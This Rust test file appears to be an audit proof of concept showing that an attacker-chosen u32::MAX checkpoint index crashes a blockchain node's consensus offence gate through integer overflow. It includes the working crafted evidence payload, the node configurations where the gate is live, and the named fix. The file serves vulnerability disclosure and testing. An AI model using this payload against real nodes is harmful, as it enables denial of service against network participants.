//! MSK-26A-PALW-19 -- check_legs_refutation_v1 adds 1 to an attacker-chosen u32 CheckpointChain
//! leaf index before either opening is verified against the committed tree, so carried evidence with
//! `earlier_opening.leaf_index == u32::MAX` panics ("attempt to add with overflow").
//!
//! Audit commit : 3d2bd6dc5d77d37396d1b73c4c13526090923b92
//! Crate        : kaspa-consensus-core (consensus/core)
//! Command      :
//!   cp docs/security/audits/2026-09-claude-pre-freeze/poc/MSK-26A-PALW-19.rs \
//!      consensus/core/tests/audit_poc_msk_26a_palw_19.rs && \
//!   cargo test -p kaspa-consensus-core --test audit_poc_msk_26a_palw_19 -- --nocapture ; \
//!   rm consensus/core/tests/audit_poc_msk_26a_palw_19.rs
//!
//! PASS = the vulnerable behaviour is present:
//!   * test 1: `check_legs_refutation_v1` PANICS with "attempt to add with overflow" on a
//!     self-consistent, shape-fault-free binding (built with the public honest builder) carrying
//!     CheckpointChain evidence whose earlier index is u32::MAX;
//!   * test 2: the same evidence, wrapped as a V1 `PanelFalseValid` payload with a REAL ML-DSA-87
//!     Valid receipt (verified with libcrux portable, as processor.rs's verify closure does) and a
//!     claim id that is NOT the binding's job id, makes the processor's stateless gate
//!     `palw_verify_objective_offence_v1` panic -- the job/claim match is never reached;
//!   * test 3: records where that gate is live: testnet-11/RC (`palw_rc_shipped_params`) arms
//!     `palw_objective_offence` without `palw_offence_attribution`; testnet-12 arms attribution at
//!     DAA 0 (V1 `PanelFalseValid` refused by name: SupersededOnThisNetwork); the mainnet preset
//!     does not arm `palw_objective_offence` at all.
//! Once fixed (checked_add, or both openings verified first) tests 1 and 2 FAIL (no panic; the
//! evidence is refused with an error instead).
//!
//! Release builds panic too: the workspace `[profile.release]` sets `overflow-checks = true`, and
//! kaspad's panic hook (core/src/panic.rs) exits the process.

use kaspa_consensus_core::Hash64;
use kaspa_consensus_core::palw_legs::{
    PALW_LEGS_DOMAIN_CHECKPOINT_MERKLE_LEAF, PALW_LEGS_DOMAIN_CHECKPOINT_MERKLE_NODE, PALW_LEGS_MAX_CHECKPOINTS,
    PALW_LEGS_OBJECT_VERSION_V1, PalwActivationTapProfileV1, PalwCheckpointProfileV1, PalwLegOpeningV1, PalwLegsBindingV1,
    PalwLegsCommitmentBuilderV1, PalwLegsError, PalwLegsEvidenceV1, PalwLegsMaterial, PalwLegsRefutationV1,
    check_legs_refutation_v1, leg_opening_v1,
};
use kaspa_consensus_core::palw_offence_v1::{
    PALW_PANEL_FALSE_VALID_VERSION_V1, PalwOffenceKindV1, PalwPanelContradictionV1, PalwPanelFalseValidEvidenceV1,
    palw_offence_evidence_digest_v1, palw_verify_objective_offence_v1,
};
use kaspa_consensus_core::palw_panel_v2::{PALW_RECEIPT_V2_MLDSA87_CONTEXT, PalwReceiptVerdictV2, PalwSeatReceiptV2, palw_receipt_message_v2};
use kaspa_consensus_core::palw_state_v2::PalwBondKeyV2;
use kaspa_consensus_core::palw_v2::{PALW_TRACE_COMMITMENT_VERSION_V2, PalwJobContextV2, PalwLogitsDtypeV2, trace_scheme_id_v2};
use kaspa_consensus_core::tx::{TransactionId, TransactionOutpoint};
use std::panic::{AssertUnwindSafe, catch_unwind};

fn h64(seed: u8) -> Hash64 {
    Hash64::from_bytes([seed; 64])
}

/// An arbitrary job context the attacker picks (it need not be any real claim's).
fn attacker_context() -> PalwJobContextV2 {
    PalwJobContextV2 {
        version: PALW_TRACE_COMMITMENT_VERSION_V2,
        network_id: b"misaka-testnet-11".to_vec(),
        job_id: h64(0x11),
        job_nullifier: h64(0x12),
        assignment_id: h64(0x13),
        execution_seed: [0x22; 32],
        model_profile_id: h64(0x31),
        runtime_manifest_hash: h64(0x32),
        runtime_class_id: h64(0x33),
        shape_profile_id: h64(0x34),
        trace_scheme_id: trace_scheme_id_v2(),
        cu_ruleset_id: h64(0x36),
        tokenizer_id: h64(0x37),
        prompt_token_ids_hash: h64(0x38),
        // P = 3, D = 5 => 4 decode calls; interval 2 => 2 checkpoints.
        declared_prefill_tokens: 3,
        exact_decode_tokens: 5,
        max_context_tokens: 64,
    }
}

/// A self-consistent binding with NO shape faults, built through the public honest builder.
fn honest_binding() -> (PalwLegsBindingV1, PalwLegsMaterial) {
    let context = attacker_context();
    let taps = PalwActivationTapProfileV1 {
        version: PALW_LEGS_OBJECT_VERSION_V1,
        tap_semantics_id: h64(0x41),
        tap_layer_indices: vec![8, 16],
        model_total_layers: 28,
        hidden_dim: 4,
        dtype: PalwLogitsDtypeV2::F32Le,
    };
    let ckpt = PalwCheckpointProfileV1 { version: PALW_LEGS_OBJECT_VERSION_V1, checkpoint_interval: 2, state_layout_id: h64(0x51) };
    let mut b = PalwLegsCommitmentBuilderV1::new(context.clone(), taps.clone(), ckpt.clone()).expect("builder");
    // Activation rows in canonical order: prefill (tap-major, then position), then decode calls.
    for tap in 0..taps.tap_count() {
        for pos in 0..context.declared_prefill_tokens {
            b.push_activation_row(0, tap, pos, &[1.0, 2.0, 3.0, 4.0]).expect("prefill row");
        }
    }
    for call in 1..context.exact_decode_tokens {
        for tap in 0..taps.tap_count() {
            b.push_activation_row(call, tap, 0, &[0.5, 0.25, 0.125, 1.5]).expect("decode row");
        }
    }
    assert_eq!(b.expected_checkpoint_count(), 2);
    b.push_checkpoint(2, h64(0x61)).expect("checkpoint 0");
    b.push_checkpoint(4, h64(0x62)).expect("checkpoint 1");
    b.finish_with_material(h64(0x71)).expect("finish")
}

fn ckpt_opening(material: &PalwLegsMaterial, index: u32) -> PalwLegOpeningV1 {
    leg_opening_v1(
        PALW_LEGS_DOMAIN_CHECKPOINT_MERKLE_LEAF,
        PALW_LEGS_DOMAIN_CHECKPOINT_MERKLE_NODE,
        &material.checkpoint_leaf_hashes,
        index,
        PALW_LEGS_MAX_CHECKPOINTS,
    )
    .expect("opening")
}

/// CheckpointChain evidence whose earlier index is u32::MAX (nothing else needs to be valid).
fn overflowing_refutation() -> PalwLegsRefutationV1 {
    let (binding, material) = honest_binding();
    let mut earlier = ckpt_opening(&material, 0);
    earlier.leaf_index = u32::MAX; // attacker-chosen, never bounded by checkpoint_count before the add
    let later = ckpt_opening(&material, 1);
    PalwLegsRefutationV1 {
        binding,
        evidence: PalwLegsEvidenceV1::CheckpointChain {
            earlier_opening: earlier,
            earlier_preimage: material.checkpoint_leaves[0].clone(),
            later_opening: later,
            later_preimage: material.checkpoint_leaves[1].clone(),
        },
    }
}

fn panic_message(p: Box<dyn std::any::Any + Send>) -> String {
    p.downcast_ref::<&str>().map(|s| s.to_string()).or_else(|| p.downcast_ref::<String>().cloned()).unwrap_or_default()
}

#[test]
fn msk_26a_palw_19_checkpoint_chain_u32_max_index_panics() {
    // Controls: the honest binding verifies and is shape-clean (Shape evidence -> NoFaultFound), and a
    // non-adjacent pair with SMALL indices is refused cleanly -- the adjacency guard is the only thing hit.
    let (binding, material) = honest_binding();
    assert_eq!(
        check_legs_refutation_v1(&PalwLegsRefutationV1 { binding: binding.clone(), evidence: PalwLegsEvidenceV1::Shape }),
        Err(PalwLegsError::NoFaultFound),
        "binding must be self-consistent and free of shape faults"
    );
    let clean = PalwLegsRefutationV1 {
        binding,
        evidence: PalwLegsEvidenceV1::CheckpointChain {
            earlier_opening: ckpt_opening(&material, 1),
            earlier_preimage: material.checkpoint_leaves[1].clone(),
            later_opening: ckpt_opening(&material, 1),
            later_preimage: material.checkpoint_leaves[1].clone(),
        },
    };
    assert_eq!(check_legs_refutation_v1(&clean), Err(PalwLegsError::ChainEvidenceNotAdjacent { earlier: 1, later: 1 }));

    // The attack: earlier_opening.leaf_index = u32::MAX.
    let refutation = overflowing_refutation();
    let outcome = catch_unwind(AssertUnwindSafe(|| check_legs_refutation_v1(&refutation)));
    match outcome {
        Err(p) => {
            let msg = panic_message(p);
            println!("check_legs_refutation_v1 PANICKED: {msg:?}");
            assert!(msg.contains("attempt to add with overflow"), "unexpected panic message: {msg}");
        }
        Ok(r) => panic!("no panic -- the overflow is fixed (returned {r:?})"),
    }
}

// ---- the processor's V1 PanelFalseValid gate (processor.rs:9737) ---------------------------------

fn verify(pk: &[u8], msg: &[u8], sig: &[u8], ctx: &[u8]) -> bool {
    // processor.rs `verify_mldsa87_with_context_bool` -> crypto/txscript/src/lib.rs:141, inlined:
    // length checks, then libcrux's PORTABLE verify.
    use libcrux_ml_dsa::ml_dsa_87::{MLDSA87Signature, MLDSA87VerificationKey, portable};
    let (Ok(k), Ok(s)) = (<[u8; 2592]>::try_from(pk), <[u8; 4627]>::try_from(sig)) else { return false };
    portable::verify(&MLDSA87VerificationKey::new(k), msg, ctx, &MLDSA87Signature::new(s)).is_ok()
}

fn sign(kp: &libcrux_ml_dsa::ml_dsa_87::MLDSA87KeyPair, msg: &[u8], ctx: &[u8]) -> Vec<u8> {
    libcrux_ml_dsa::ml_dsa_87::sign(&kp.signing_key, msg, ctx, [7u8; 32]).expect("signs").as_ref().to_vec()
}

#[test]
fn msk_26a_palw_19_v1_panel_false_valid_gate_panics_before_the_claim_match() {
    use libcrux_ml_dsa::ml_dsa_87::generate_key_pair;
    let domain = Hash64::from_u64_word(0x7E57_0011);
    // Any claim a seat signed Valid on; deliberately NOT the binding's job id (0x11..).
    let claim = Hash64::from_u64_word(0xC1A1_0000_0000_0042);
    let seat = TransactionOutpoint { transaction_id: TransactionId::from_u64_word(0x5EA7), index: 0 };
    let seat_kp = generate_key_pair([3u8; 32]);
    let seat_pk: Vec<u8> = seat_kp.verification_key.as_ref().to_vec();
    let msg = palw_receipt_message_v2(domain, claim, PalwReceiptVerdictV2::Valid, 0);
    let receipt = PalwSeatReceiptV2 {
        claim,
        verdict: PalwReceiptVerdictV2::Valid,
        seat_bond: PalwBondKeyV2(seat),
        signed_daa: 0,
        signature: sign(&seat_kp, msg.as_byte_slice(), PALW_RECEIPT_V2_MLDSA87_CONTEXT),
    };
    assert!(verify(&seat_pk, msg.as_byte_slice(), &receipt.signature, PALW_RECEIPT_V2_MLDSA87_CONTEXT), "genuine receipt");

    let refutation = overflowing_refutation();
    assert_ne!(refutation.binding.job_context.job_id, claim, "the binding belongs to no real claim");
    let payload = PalwPanelFalseValidEvidenceV1 {
        version: PALW_PANEL_FALSE_VALID_VERSION_V1,
        claim_id: claim,
        network_domain: domain,
        accused_seat: seat,
        valid_receipt: receipt,
        executor_pubkey: vec![0u8; 4],
        contradiction: PalwPanelContradictionV1::Legs(refutation),
    };
    let evidence = borsh::to_vec(&payload).expect("serializes");
    let evidence_id = palw_offence_evidence_digest_v1(&evidence);
    println!("V1 PanelFalseValid evidence: {} bytes", evidence.len());

    // Control: the same payload with a SMALL non-adjacent pair is refused, not accepted.
    let mut control = payload.clone();
    if let PalwPanelContradictionV1::Legs(r) = &mut control.contradiction
        && let PalwLegsEvidenceV1::CheckpointChain { earlier_opening, .. } = &mut r.evidence
    {
        earlier_opening.leaf_index = 5;
    }
    let control_bytes = borsh::to_vec(&control).unwrap();
    let control_verdict = palw_verify_objective_offence_v1(
        PalwOffenceKindV1::PanelFalseValid,
        &seat,
        &palw_offence_evidence_digest_v1(&control_bytes),
        &control_bytes,
        &seat_pk,
        true,
        domain.as_byte_slice(),
        1 << 22,
        verify,
    );
    println!("control (earlier index 5): {control_verdict:?}");
    assert!(control_verdict.is_err());

    // The attack: the processor's stateless gate, exactly as processor.rs:9737 calls it.
    let outcome = catch_unwind(AssertUnwindSafe(|| {
        palw_verify_objective_offence_v1(
            PalwOffenceKindV1::PanelFalseValid,
            &seat,
            &evidence_id,
            &evidence,
            &seat_pk,
            true,
            domain.as_byte_slice(),
            1 << 22,
            verify,
        )
    }));
    match outcome {
        Err(p) => {
            let msg = panic_message(p);
            println!("palw_verify_objective_offence_v1 PANICKED: {msg:?}");
            assert!(msg.contains("attempt to add with overflow"), "unexpected panic message: {msg}");
        }
        Ok(r) => panic!("no panic -- the overflow is fixed (returned {r:?})"),
    }
}

// ---- where the V1 gate is live (runtime, from the shipped constructors) ---------------------------

#[test]
fn msk_26a_palw_19_reachability_on_shipped_params() {
    use kaspa_consensus_core::config::params::{mainnet_shipped_params, palw_rc_shipped_params, palw_t12_shipped_params};
    let probe = [0u64, 1_000, 8_500, 1_000_000, u64::MAX - 1];
    let v1_route_live = |p: &kaspa_consensus_core::config::params::Params, d: u64| {
        p.palw_objective_offence_at(d) && !p.palw_offence_attribution.is_some_and(|f| f.is_active(d))
    };
    let t12 = palw_t12_shipped_params();
    let main = mainnet_shipped_params();
    let rc = palw_rc_shipped_params();
    for (name, p) in [("testnet-12", &t12), ("mainnet", &main), ("testnet-11/rc", &rc)] {
        println!(
            "{name:14} objective_offence={:?} attribution={:?} v1_route_live@{:?}={:?}",
            p.palw_objective_offence.map(|f| f.daa_score()),
            p.palw_offence_attribution.map(|f| f.daa_score()),
            probe,
            probe.iter().map(|d| v1_route_live(p, *d)).collect::<Vec<_>>()
        );
    }
    assert!(probe.iter().all(|d| !v1_route_live(&t12, *d)), "testnet-12: V1 PanelFalseValid superseded from genesis");
    assert!(probe.iter().all(|d| !main.palw_objective_offence_at(*d)), "mainnet preset: objective offences not armed");
    assert!(v1_route_live(&rc, 8_500) && !v1_route_live(&rc, 8_499), "testnet-11/RC: V1 gate live from DAA 8,500");
}
